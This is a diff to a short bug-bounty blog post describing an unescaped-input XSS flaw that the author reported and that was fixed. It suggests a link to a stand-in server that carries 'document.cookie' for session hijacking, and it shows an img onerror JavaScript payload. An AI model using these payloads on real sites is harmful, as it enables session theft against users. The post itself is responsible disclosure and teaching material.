@@ -47,7 +47,7 @@ The page looked like this:
 
 Hence, clicking the link will result in a request to `www.maliciouslink.com`. Although this does not seem malicious, we could replace this link with `www.yourserver.com/cookie?+document.cookie` to send the cookie of an authenticated user to your server and hijack their session. Another possible exploit is to use the onerror attribute in the img tag to execute some arbitrary JavaScript code:
 
-`<img src=x onerror=alert('XSS') />`
+`<img src=x onerror=alert('XSS')>`
 
 There are probably a dozen ways to exploit this vulnerability, however I reported it shortly after I found out the input did not get escaped or sanitized. Their team fixed the bug two days later and thanked me for my findings. Overall, it was a fun and easy first bug. Hopefully this is the start of many other bug discoveries!
 
